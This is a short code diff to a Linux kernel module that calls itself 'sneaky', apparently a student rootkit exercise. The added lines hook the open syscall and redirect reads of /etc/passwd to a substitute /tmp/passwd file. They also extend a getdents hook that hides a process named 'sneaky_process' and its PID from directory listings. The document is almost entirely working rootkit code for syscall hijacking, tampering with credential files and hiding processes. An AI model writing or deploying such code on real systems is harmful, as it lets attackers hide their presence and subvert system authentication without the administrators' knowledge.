@@ -52,6 +52,10 @@ asmlinkage int (*original_call)(const char * pathname, int flags);
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char * pathname, int flags) {
   printk(KERN_INFO "getting into sneaky_sys_open\n");
+  if (strcmp(pathname, "/etc/passwd") == 0) {
+    printk(KERN_INFO "find /etc/passwd");
+    copy_to_user((void *)pathname, "/tmp/passwd", strlen("/tmp/passwd"));
+  }
   return original_call(pathname, flags);
 }
 
@@ -79,6 +83,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd,
     d = (struct linux_dirent *)(dirp + bpos);
     if ((strcmp(d->d_name, "sneaky_process") == 0) ||
         (strcmp(d->d_name, sneaky_pid) == 0)) {
+      printk(KERN_INFO "find sneaky_process of sneaky_pid");
       memcpy(dirp + bpos, dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
       nread -= d->d_reclen;
     }
